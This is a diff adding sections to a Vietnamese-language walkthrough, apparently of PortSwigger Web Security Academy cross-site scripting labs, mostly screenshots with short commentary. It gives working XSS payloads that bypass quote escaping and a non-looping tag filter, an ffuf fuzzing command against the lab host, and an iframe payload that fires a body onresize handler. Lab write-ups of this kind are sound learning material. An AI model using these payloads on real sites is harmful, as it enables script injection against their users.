@@ -267,7 +267,84 @@ Tôi đổi cái dấu [[ thành {{ và payload nó như này `{{constructor.con
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/9f482d29-0db2-4c63-b000-58e39e99a61d)
 
+Bật intercept và search gì đó:
+
+![image](https://github.com/user-attachments/assets/ebb06977-6868-424e-a9ea-8226e5bab514)
+
+![image](https://github.com/user-attachments/assets/814ab1af-9503-4315-bb36-0628f5a0db4d)
+
+Tôi để ý đến cái `search('search-results')` này
+
+![image](https://github.com/user-attachments/assets/447b2a3d-4971-4802-a24e-caedcf832f54)
+
+![image](https://github.com/user-attachments/assets/aadd06a9-337b-4ea6-9ea9-bdbf3a9f7e90)
+
+Tôi thử với payload `lmao"}` thì
+
+![image](https://github.com/user-attachments/assets/fc2535b3-2d4b-4c45-a1d0-6bfbb9148b08)
+
+Có cái filter dấu " bằng cách thêm \ vào trước nó, thử với payload  `lmao \" lmao` thì chữ đổi màu bởi vì trong cái \" thì khi thêm \ vào trước " nó sẽ thành \\", từ đó dấu \ sẽ thành con tốt thí, biến thành string 
+
+![image](https://github.com/user-attachments/assets/944e4d0d-95f4-4f9d-bc9a-36dd90f41194)
+
+Vấn đề bây giờ là dấu " ở sau, sau khi chèn `lmao \"} alert(window.origin)` thì nó ra như này:
+
+![image](https://github.com/user-attachments/assets/7406dbaa-82c8-4d78-b8d7-9777ed0a21c2)
+
+Xong, thấy nó ghi đã solve, với cả solution dùng payload này `\"-alert(1)}//`
+
+<h1>---------------------------------------------------------</h1>
+<br>
+
+![image](https://github.com/user-attachments/assets/fe75c818-4c46-4ba9-8397-e92da5018908)
+
+Test thử 
+
+![image](https://github.com/user-attachments/assets/4c81e658-863c-4939-bbca-e3d72afd0c19)
+
+Đây là cái code nó filter đây:
+
+![image](https://github.com/user-attachments/assets/432ac9af-81db-4320-9696-eb0906c4359a)
+
+Bỏ qua cái trên đi, đọc src code thì nhận ra nó không hề dùng vòng lặp, tức là nếu tôi dùng nhiều <> thì có vẻ sẽ được, tôi dùng payload `<><><><script>alert(origin.window)</script>` 
+
+![image](https://github.com/user-attachments/assets/a8363986-9ebd-4aeb-93db-4cf45064279e)
+
+Dùng xong thì tôi quên mất đây là DOM xss, tôi xoay sang `<><><><img src="lmao" onerror="alert(1)">`
+
+![image](https://github.com/user-attachments/assets/87dc5998-f510-420f-856c-3f3ca7fb5742)
+
+<h1>---------------------------------------------------------</h1>
+<br>
+
+![image](https://github.com/user-attachments/assets/549ed542-e65a-4406-bec6-968b1730937a)
+
+Ầu
+
+![image](https://github.com/user-attachments/assets/1c357d6c-c1fa-4bf5-a243-c0326bfe589d)
+
+Tôi chạy FUZZ để mò payload `ffuf -u https://0a8e00b1031a85a9828cacc6007d0016.web-security-academy.net/?search=FUZZ -w payload_tag_event.txt:FUZZ`
+
+![image](https://github.com/user-attachments/assets/bebf8d86-5568-4414-91d1-ce97ddd0b0e3)
+
+À tôi quên là bên PortSwigger nó chặn bên thứ 3, quên, tôi chạy intruder thì được 1 số thẻ body với custom là 2 thẻ không bị cấm:
+
+![image](https://github.com/user-attachments/assets/d7207196-cfc7-4823-ae2c-ca48c0e953e3)
+
+Trong 1 đống các payload thì tôi thấy cái onresize nó ngắn ngắn, search thử thì thấy chức năng là chạy alert khi chỉnh lại kích thước của cửa sổ trình duyệt, nếu nạn nhân điều chỉnh cửa sổ thì đi 
+
+![image](https://github.com/user-attachments/assets/f870c75e-728b-4a52-bef2-f7d876a71a9c)
+
+Thử `<body onresize="print()" onload="window.resizeTo(800,600)"></body>` thì thấy không được do cấm cái window kia
+
+![image](https://github.com/user-attachments/assets/2493a51a-e477-4c44-b457-945e4598ddcb)
+
+`<iframe src="https://0a8e00b1031a85a9828cacc6007d0016.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
+
+<h1>---------------------------------------------------------</h1>
+<br>
 
 
 
